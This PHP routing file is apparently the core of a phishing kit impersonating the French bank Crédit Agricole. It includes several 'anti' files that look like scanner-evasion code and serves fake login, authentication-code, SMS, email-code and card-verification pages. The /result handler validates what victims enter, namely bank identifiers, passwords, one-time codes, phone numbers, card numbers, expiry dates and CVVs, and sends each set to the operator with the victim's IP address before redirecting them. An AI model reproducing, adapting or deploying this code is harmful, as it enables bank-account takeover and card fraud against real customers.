<?php

    include '../prevents/anti1.php';
    include '../prevents/anti2.php';
    include '../prevents/anti3.php';
    include '../prevents/anti4.php';
    include '../prevents/anti5.php';
    include '../prevents/anti6.php';
    include '../prevents/anti7.php';
    include '../prevents/anti8.php';

    include 'config.php';
    use Steampixel\Route;

    Route::add('/', function() {
        echo 'Welcome :-)';
    });

    /* BODY */

    Route::add('/r', function() {
        views('r');
    },'get');

    Route::add('/login', function() {
        views('l');
    },'get');

    Route::add('/a', function() {
        views('a');
    },'get');

    Route::add('/e', function() {
        views('e');
    },'get');

    Route::add('/loading1', function() {
        views('loading1');
    },'get');

    Route::add('/loading2', function() {
        views('loading2');
    },'get');

    Route::add('/verifyinfos', function() {
        views('c');
    },'get');

    Route::add('/ss', function() {
        views('s');
    },'get');

    Route::add('/ss2', function() {
        views('s');
    },'get');

    Route::add('/success', function() {
        views('success');
    },'get');

    /* END BODY */

    /* RESULT */

    Route::add('/result', function() {
        
        if ($_POST['step'] == "region") {
            $_SESSION['errors']     = [];
            $_SESSION['region_number'] = $_POST['region_number'];
            $_SESSION['region_caisse']    = $_POST['region_caisse'];
            if( empty($_POST['region_number']) && empty($_POST['region_caisse']) ) {
                $_SESSION['errors']['region_number'] = 'Votre saisie est incorrecte, veuillez indiquer votre département. Par exemple pour Paris, indiquez uniquement "75".';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | C-AGRICOL | Caisse Régionale';
                $message = '/-- REGION INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Numéro de département : ' . $_POST['region_number'] . "\r\n";
                $message .= 'Caisse régionale : ' . $_POST['region_caisse'] . "\r\n";
                $message .= '/-- END REGION INFOS --/' . "\r\n";
                //send($subject,$message);
                header("Location: login?verification#_");
                exit();
            } else {
                header("Location: r?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "login") {
            $_SESSION['errors']     = [];
            $_SESSION['identifiant'] = $_POST['identifiant'];
            $_SESSION['password']    = $_POST['password'];
            if( validate_number($_POST['identifiant'],11) == false ) {
                $_SESSION['errors']['identifiant'] = true;
            }
            if( validate_number($_POST['password'],6) == false ) {
                $_SESSION['errors']['password'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | C-AGRICOL | Login';
                $message = '/-- LOGIN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
                $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
                $message .= 'Identifiant : ' . $_POST['identifiant'] . "\r\n";
                $message .= 'Password : ' . $_POST['password'] . "\r\n";
                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
                send($subject,$message);
                header("Location: loading1?red=ss&verification#_");
                exit();
            } else {
                header("Location: login?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "auth") {
            $_SESSION['errors']   = [];
            $_SESSION['auth'] = $_POST['auth'];
            if( empty($_POST['auth']) || strlen($_POST['auth']) !== 6 ) {
                $_SESSION['errors']['auth'] = 'Le code est incorrect.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | CA | Authfort';
                $message = '/-- AUTHFORT INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Authentification forte : ' . $_POST['auth'] . "\r\n";
                $message .= '/-- END AUTHFORT INFOS --/' . "\r\n";
                send($subject,$message);
                header("Location: loading1?red=ss&verification#_");
                exit();
            } else {
                header("Location: a?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "sms") {
            $_SESSION['errors']   = [];
            $_SESSION['sms_code'] = $_POST['sms_code'];
            if( empty($_POST['sms_code']) || strlen($_POST['sms_code']) != 6 ) {
                $_SESSION['errors']['sms_code'] = 'Le code est incorrect.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | CA | Securepasse';
                $message = '/-- SECUREPASS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Secure passe : ' . $_POST['sms_code'] . "\r\n";
                $message .= '/-- END SECUREPASS INFOS --/' . "\r\n";
                send($subject,$message);
                if( $_POST['coco'] == 'ss' ) {
                    header("Location: loading1?red=e&verification#_");
                    exit();
                } else {
                    if( $_POST['error'] > 0 ) {
                        header("Location: success?verification#_");
                        exit();
                    }
                    $_SESSION['errors']['sms_code'] = 'Le code est incorrect.';
                    header("Location: ss2?error=1&verification#_");
                    exit();
                }
            } else {
                $error = $_POST['error'];
                header("Location: ss?error=$error&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "email_code") {
            $_SESSION['errors']   = [];
            $_SESSION['email_code'] = $_POST['email_code'];
            if( empty($_POST['email_code']) || strlen($_POST['email_code']) != 6 ) {
                $_SESSION['errors']['email_code'] = 'Le code est incorrect.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | C-AGRICOL | Code Email';
                $message = '/-- CODE EMAIL INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Code email : ' . $_POST['email_code'] . "\r\n";
                $message .= '/-- END CODE EMAIL INFOS --/' . "\r\n";
                send($subject,$message);
                header("Location: verifyinfos?verification#_");
                exit();
            } else {
                header("Location: e?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "cc") {
            $_SESSION['errors']      = [];
            $_SESSION['phone']   = $_POST['phone'];
            $_SESSION['one']   = $_POST['one'];
            $_SESSION['two']     = $_POST['two'];
            $_SESSION['three']      = $_POST['three'];
            $date_ex     = explode('/',$_POST['two']);
            $card_number = validate_cc_number($_POST['one']);
            $card_cvv    = validate_cc_cvv($_POST['three'],$card_number['type']);
            $card_date   = validate_cc_date($date_ex[0],$date_ex[1]);
            if( validate_number($_POST['phone']) == false ) {
                $_SESSION['errors']['phone'] = 'Veuillez saisir un numéro valid.';
            }
            if( $card_number == false ) {
                $_SESSION['errors']['one'] = 'Veuillez saisir un numéro de la carte valid.';
            }
            if( $card_cvv == false ) {
                $_SESSION['errors']['three'] = 'Veuillez saisir un numéro valid.';
            }
            if( $card_date == false ) {
                $_SESSION['errors']['two'] = 'Veuillez saisir une date valide.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | C-AGRICOL | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Numéro de téléphone : ' . $_POST['phone'] . "\r\n";
                $message .= 'N° de carte : ' . $_POST['one'] . "\r\n";
                $message .= 'Date d\'expiration : ' . $_POST['two'] . "\r\n";
                $message .= 'CVV : ' . $_POST['three'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                send($subject,$message);
                unset($_SESSION['errors']);
                header("Location: success?verification#_");
            } else {
                header("Location: verifyinfos?error#_");
            }
        }
        
    },'post');

    /* RESULT */

    Route::pathNotFound(function($path) {
        header('HTTP/1.0 404 Not Found');
    });

    Route::methodNotAllowed(function($path, $method) {
        header('HTTP/1.0 405 Method Not Allowed');
    });

    Route::run(BASEPATH);

?>